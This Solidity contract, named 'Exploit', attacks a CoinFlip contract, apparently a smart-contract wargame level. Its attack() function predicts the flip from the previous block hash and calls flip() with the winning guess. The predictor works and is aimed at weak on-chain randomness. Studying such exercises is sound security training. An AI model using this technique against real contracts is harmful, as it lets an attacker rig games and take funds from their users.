// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
  function consecutiveWins (  ) external view returns ( uint256 );
  function flip ( bool _guess ) external returns ( bool );
}

contract Exploit {
    using SafeMath for uint256;
    ICoinFlip CoinFlip;
    address public owner;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _address) payable {
        owner = msg.sender;
        CoinFlip = ICoinFlip(_address);
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function attack() onlyOwner public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip.flip(side);
    }

}
